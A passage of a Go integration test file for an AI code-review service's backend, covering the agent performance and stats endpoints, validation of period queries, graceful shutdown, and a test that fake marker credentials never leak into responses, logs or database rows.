		t.Fatal(err)
	}
	if diff := cmp.Diff(perf.Agents[0].Metrics, st.Metrics); diff != "" {
		t.Errorf("the stats' metrics differ from the dashboard row (-dashboard +stats):\n%s", diff)
	}
	if len(st.Skills) != 2 || st.Skills[0].Runs != 2 || st.Skills[1].Runs != 1 {
		t.Errorf("skills_used = %+v, want one skill in 2 runs and one in 1", st.Skills)
	}
	if len(st.Memory) != 2 || st.Memory[0].Label != "remember A" || st.Memory[0].Runs != 2 || st.Memory[1].Label != "remember B" {
		t.Errorf("memory_pulled = %+v, want remember A in 2 runs, remember B in 1", st.Memory)
	}
	var statuses []string
	for _, h := range st.History {
		statuses = append(statuses, h.Status)
	}
	if diff := cmp.Diff([]string{"done", "done", "failed", "cancelled"}, statuses); diff != "" {
		t.Errorf("run_history statuses mismatch (-want newest first +got):\n%s", diff)
	}

	if resp := s.get("/agents/" + unknownID + "/stats"); resp.Status != http.StatusNotFound || resp.errorCode(t) != "not_found" || message(t, resp) != "Agent not found" {
		t.Errorf("stats of an unknown agent = %d %s, want 404 not_found Agent not found", resp.Status, resp.Body)
	}
	if resp := s.get("/agents/performance"); resp.Status != http.StatusOK {
		t.Errorf("GET /agents/performance = %d %s, want 200 (not answered as an agent id)", resp.Status, resp.Body)
	}
	if resp := s.get("/agents/not-a-uuid/stats"); resp.Status != http.StatusUnprocessableEntity {
		t.Errorf("stats with a non-UUID id = %d, want 422", resp.Status)
	}
}

// AC5017 (FR5047, FR5048, EC5030): the period queries both routes refuse, and the custom range they
// echo.
func TestPerformance_PeriodQueries(t *testing.T) {
	s := startStack(t, perfSpec())
	agent := agentByName(t, s, agentGeneral)
	type issue struct{ keyword, path, message string }
	tests := []struct {
		name  string
		query string
		want  []issue
	}{
		{"unknown period", "period=7d", []issue{{"invalid_enum_value", "/period", "Invalid enum value. Expected '1d' | '30d' | 'custom', received '7d'"}}},
		{"from with a preset", "period=1d&from=2026-01-01T00:00:00Z", []issue{{"custom", "/from", "from is only allowed with period=custom"}}},
		{"custom without to", "period=custom&from=2026-01-01T00:00:00Z", []issue{{"custom", "/to", "to is required with period=custom"}}},
		{"custom without both", "period=custom", []issue{{"custom", "/from", "from is required with period=custom"}, {"custom", "/to", "to is required with period=custom"}}},
		{"to before from", "period=custom&from=2026-01-02T00:00:00Z&to=2026-01-01T00:00:00Z", []issue{{"custom", "/to", "to must be after from"}}},
		{"367 days", "period=custom&from=2026-01-01T00:00:00Z&to=2027-01-03T00:00:00Z", []issue{{"custom", "/to", "The range can be at most 366 days"}}},
		{"date only", "period=custom&from=2026-01-01&to=2026-01-05T00:00:00Z", []issue{{"invalid_string", "/from", "Invalid datetime"}}},
	}
	for _, route := range []string{"/agents/performance", "/agents/" + agent + "/stats"} {
		kind := "dashboard"
		if strings.HasSuffix(route, "/stats") {
			kind = "stats"
		}
		for _, tc := range tests {
			t.Run(kind+"/"+tc.name, func(t *testing.T) {
				resp := s.get(route + "?" + tc.query)
				if resp.Status != http.StatusUnprocessableEntity || resp.errorCode(t) != "validation_error" {
					t.Fatalf("GET %s?%s = %d %s, want 422 validation_error", route, tc.query, resp.Status, resp.Body)
				}
				var got []issue
				for _, d := range obj(t, resp.JSON(t), "error")["details"].([]any) {
					m := d.(map[string]any)
					got = append(got, issue{m["keyword"].(string), m["instancePath"].(string), m["message"].(string)})
				}
				if diff := cmp.Diff(tc.want, got, cmp.AllowUnexported(issue{})); diff != "" {
					t.Errorf("details of ?%s mismatch (-want +got):\n%s", tc.query, diff)
				}
			})
		}
		resp := s.get(route + "?period=custom&from=2026-10-01T00:00:00Z&to=2026-10-08T00:00:00Z")
		if resp.Status != http.StatusOK {
			t.Fatalf("GET %s with a valid 7-day range = %d %s, want 200", route, resp.Status, resp.Body)
		}
		if diff := cmp.Diff(map[string]any{"key": "custom", "from": "2026-10-01T00:00:00.000Z", "to": "2026-10-08T00:00:00.000Z"}, obj(t, resp.JSON(t), "period")); diff != "" {
			t.Errorf("period echo of %s mismatch (-want +got):\n%s", route, diff)
		}
	}
	if resp := s.get("/agents/performance?foo=bar&period=1d"); resp.Status != http.StatusOK {
		t.Errorf("an unknown query key = %d %s, want it ignored (200)", resp.Status, resp.Body)
	}
}

// AC5018 (EC5032, NFR5012): two agents and no runs give zero rows, null rates and empty arrays.
func TestPerformance_NoRunsGivesZerosAndEmptyArrays(t *testing.T) {
	s := startStack(t, perfSpec())
	execSQL(t, s, `DELETE FROM agent_runs`)
	execSQL(t, s, `DELETE FROM agents WHERE name NOT IN (?, ?)`, agentGeneral, agentSecurity)
	if n := count(t, s.db.DB, `SELECT count(*) FROM agents`); n != 2 {
		t.Fatalf("agents = %d, want 2", n)
	}

	dash := s.get("/agents/performance")
	if dash.Status != http.StatusOK {
		t.Fatalf("GET /agents/performance = %d %s, want 200", dash.Status, dash.Body)
	}
	var doc struct {
		Summary   map[string]any   `json:"summary"`
		RunsTrend []map[string]any `json:"runs_trend"`
		Agents    []struct {
			Metrics   map[string]any   `json:"metrics"`
			RunsTrend []map[string]any `json:"runs_trend"`
		} `json:"agents"`
		CostByAgent []any `json:"cost_by_agent"`
		CostByModel []any `json:"cost_by_model"`
	}
	if err := json.Unmarshal(dash.Body, &doc); err != nil {
		t.Fatal(err)
	}
	if len(doc.Agents) != 2 || doc.CostByAgent == nil || len(doc.CostByAgent) != 0 || doc.CostByModel == nil || len(doc.CostByModel) != 0 {
		t.Errorf("dashboard = %s, want two rows and empty segment arrays (not null)", dash.Body)
	}
	if doc.Summary["runs"] != 0.0 || doc.Summary["total_cost_usd"] != nil || doc.Summary["avg_accept_rate"] != nil || doc.Summary["most_active"] != nil {
		t.Errorf("summary = %v, want zero runs, null cost and rate, null most_active", doc.Summary)
	}
	if len(doc.RunsTrend) == 0 {
		t.Errorf("runs_trend = %v, want the zero slices", doc.RunsTrend)
	}
	for _, a := range doc.Agents {
		m := a.Metrics
		if m["runs"] != 0.0 || m["total_cost_usd"] != nil || m["avg_cost_usd"] != nil || m["avg_duration_ms"] != nil || m["last_run_at"] != nil ||
			m["accept_rate"] != nil || m["small_sample"] != false || m["decisions"] != 0.0 {
			t.Errorf("metrics = %v, want zero counts, null cost and rate fields, small_sample false", m)
		}
	}

	stats := s.get("/agents/" + agentByName(t, s, agentGeneral) + "/stats")
	var st map[string]any
	if err := json.Unmarshal(stats.Body, &st); err != nil {
		t.Fatal(err)
	}
	for _, k := range []string{"cost_by_model", "skills_used", "memory_pulled", "run_history", "findings_by_category", "runs_trend"} {
		if arr, ok := st[k].([]any); !ok || (k != "runs_trend" && len(arr) != 0) {
			t.Errorf("stats.%s = %v, want [] (not null)", k, st[k])
		}
	}
	if arr, _ := st["findings_by_severity"].([]any); len(arr) == 0 {
		t.Errorf("findings_by_severity = %v, want the zero buckets", st["findings_by_severity"])
	}
}

// ---- operations ----

// goroutinesIn counts the goroutines whose stack holds one of the needles.
func goroutinesIn(needles ...string) int {
	var buf bytes.Buffer
	if err := pprof.Lookup("goroutine").WriteTo(&buf, 2); err != nil {
		return -1
	}
	n := 0
	for _, g := range strings.Split(buf.String(), "\n\n") {
		for _, needle := range needles {
			if strings.Contains(g, needle) {
				n++
				break
			}
		}
	}
	return n
}

// AC5066 (NFR5010): with an intent refresh, a brief and a tour held open by their models, the
// backend stops within the grace period; every request ends and no goroutine of the three services
// survives.
func TestShutdown_EndsHeldIntentBriefAndOnboardingGenerations(t *testing.T) {
	needles := []string{"internal/intent/app.", "internal/brief/app.", "internal/onboarding/app.", "internal/platform/inflight."}
	baseline := goroutinesIn(needles...)

	hold := func(ctx context.Context, _ llm.Attempt) (llm.AttemptResult, error) { // gated: never opened
		<-ctx.Done()
		return llm.AttemptResult{}, ctx.Err()
	}
	sc := routed(map[string]callFn{"IntentClassification": hold, "PrBriefLlm": hold, "OnboardingTour": hold})
	s, _, repo := tourStack(t, spec{llmAdapters: sc.forAll()})
	pr := pr482(t, s)

	type result struct {
		route  string
		status int
		err    error
	}
	results := make(chan result, 3)
	for _, route := range []string{"/pulls/" + pr + "/intent/refresh", "/pulls/" + pr + "/brief", "/repos/" + repo + "/onboarding"} {
		go func() {
			status, _, err := postFromOutside(s.base, route)
			results <- result{route, status, err}
		}()
	}
	eventually(t, 30*time.Second, "the three generations to be inside their model calls", func() bool {
		return countOf(sc, "IntentClassification") == 1 && countOf(sc, "PrBriefLlm") == 1 && countOf(sc, "OnboardingTour") == 1
	})
	if goroutinesIn(needles...) <= baseline {
		t.Fatal("no goroutine of the services is running while three generations are held")
	}

	started := time.Now()
	if err := s.stop(); err != nil {
		t.Fatalf("serve returned %v after the stop signal, want nil", err)
	}
	if took := time.Since(started); took > 20*time.Second {
		t.Errorf("shutdown took %v, want it within the 20 s grace period", took)
	}
	for range 3 {
		select {
		case r := <-results:
			if r.err == nil && (r.status < 400 || r.status > 599) {
				t.Errorf("POST %s ended with %d, want an error answer or a closed connection", r.route, r.status)
			}
		case <-time.After(20 * time.Second):
			t.Fatal("a held request did not end within the grace period")
		}
	}
	eventually(t, 10*time.Second, "the generation goroutines to be gone", func() bool { return goroutinesIn(needles...) <= baseline })
	assertShutdownLog(t, s)
}

// assertShutdownLog checks that the services drained: no "did not return" warning.
func assertShutdownLog(t testing.TB, s *stack) {
	t.Helper()
	if lines := logLines(t, s.logs, "generations did not return before the deadline"); len(lines) != 0 {
		t.Errorf("shutdown warnings = %v, want none", lines)
	}
}

// secretMarkers are the credentials of the secrets test.
var secretMarkers = map[string]string{
	"GITHUB_TOKEN":       "ghp_MARKERGITHUBTOKEN0123456789abcdefghij",
	"OPENAI_API_KEY":     "sk-proj-MARKEROPENAIKEY0123456789",
	"OPENROUTER_API_KEY": "sk-or-v1-MARKEROPENROUTERKEY0123456789",
	"ANTHROPIC_API_KEY":  "sk-ant-api03-MARKERANTHROPICKEY0123456789",
}

// AC5065, AC5068 (NFR5003, NFR5014): with the credentials set to markers and every provider and
// GitHub error echoing them, no response, log line, stored row or trace holds a marker; an intent
// refresh failure carries the provider text with the key redacted.
func TestSecrets_MarkersNeverLeaveTheProcess(t *testing.T) {
	echo := func(who string) callFn {
		return func(context.Context, llm.Attempt) (llm.AttemptResult, error) {
			var all []string
			for _, v := range secretMarkers {
				all = append(all, v)
			}
			slices.Sort(all)
			return llm.AttemptResult{}, fmt.Errorf("%s upstream said: Add rate limiting; keys %s", who, strings.Join(all, " "))
		}
	}
	var failIntent atomic.Bool
	failIntent.Store(true)
	sc := routed(map[string]callFn{
		"IntentClassification": func(ctx context.Context, at llm.Attempt) (llm.AttemptResult, error) {
			if failIntent.Load() {
				return echo("intent")(ctx, at)
			}
			return mockAnswer(ctx, at)
		},
		"PrBriefLlm":     echo("brief"),
		"OnboardingTour": echo("onboarding"),
	})
	sc.needsKey = true
	s, _, repo := tourStack(t, spec{llmAdapters: sc.forAll(), env: secretMarkers, llm: fastLLM(), config: intentOn})
	pr := pr482(t, s)
	s.gh.setOverride(func(w http.ResponseWriter, r *http.Request) bool {
		if strings.HasPrefix(r.URL.Path, "/repos/acme/") {
			http.Error(w, `{"message":"denied for `+secretMarkers["GITHUB_TOKEN"]+`"}`, http.StatusForbidden)
			return true
		}
		return false
	})
	execSQL(t, s, `UPDATE pull_requests SET body = 'Fixes #12 and see docs/plan.md' WHERE id = ?`, pr)

	var bodies []string
	record := func(resp response) response {
		bodies = append(bodies, string(resp.Body))
		return resp
	}

	refresh := record(s.post("/pulls/"+pr+"/intent/refresh", nil))
	msg := message(t, refresh)
	if refresh.Status != http.StatusBadGateway || refresh.errorCode(t) != "intent_unavailable" ||
		!strings.Contains(msg, "intent upstream said: Add rate limiting") || !strings.HasPrefix(msg, "Intent derivation failed: ") {
		t.Errorf("refresh = %d %s, want 502 intent_unavailable carrying the provider text", refresh.Status, refresh.Body)
	}
	brief := record(s.post("/pulls/"+pr+"/brief", nil))
	if brief.Status != http.StatusBadGateway || message(t, brief) != "The model call failed" {
		t.Errorf("brief = %d %s, want the generic 502", brief.Status, brief.Body)
	}
	tour := record(s.post("/repos/"+repo+"/onboarding", nil))
	if tour.Status != http.StatusBadGateway || message(t, tour) != "The model call failed" {
		t.Errorf("onboarding = %d %s, want the generic 502", tour.Status, tour.Body)
	}
	record(s.get("/pulls/" + pr + "/history"))
	record(s.get("/pulls/" + pr + "/intent"))
	record(s.get("/pulls/" + pr + "/blast"))
	record(s.get("/pulls/" + pr + "/smart-diff"))
	record(s.get("/pulls/" + pr + "/brief"))
	record(s.get("/repos/" + repo + "/onboarding"))
	record(s.get("/agents/performance"))

	// Reviews with the hook on: intent derived with its GitHub reads failing, then a successful
	// refresh stored, then a second review (a cache hit).
	failIntent.Store(false)
	agent := agentByName(t, s, agentGeneral)
	for range 2 {
		for _, run := range reviewDone(t, s, pr, agent) {
			record(waitTrace(t, s, run))
			for _, ev := range eventMsgs(t, s, run) {
				bodies = append(bodies, ev.Msg)
			}
		}
	}

	// Everything stored.
	var dumps []string
	for _, table := range []string{"pr_intent", "pr_brief", "onboarding", "run_traces", "agent_runs", "reviews", "findings", "jobs", "settings", "repos", "pull_requests"} {
		dumps = append(dumps, dumpTable(t, s.db.DB, table))
	}
	for _, marker := range secretMarkers {
		for i, b := range bodies {
			if strings.Contains(b, marker) {
				t.Errorf("response/trace/event %d holds the marker %s:\n%s", i, marker, b)
			}
		}
		if strings.Contains(s.logs.String(), marker) {
			t.Errorf("the log holds the marker %s", marker)
		}
		for i, d := range dumps {
			if strings.Contains(d, marker) {
				t.Errorf("table dump %d holds the marker %s", i, marker)
			}
		}
	}
	if n := count(t, s.db.DB, `SELECT count(*) FROM pr_intent`); n != 1 {
		t.Errorf("pr_intent rows = %d, want the one the successful derivation stored", n)
	}
}

// dumpTable is every row of a table as JSON text.
func dumpTable(t testing.TB, db *gorm.DB, table string) string {
	t.Helper()
	var rows []string
	if err := db.Raw(fmt.Sprintf(`SELECT row_to_json(x)::text FROM %q x`, table)).Scan(&rows).Error; err != nil {
		t.Fatalf("dump %s: %v", table, err)
	}
	return strings.Join(rows, "\n")
}
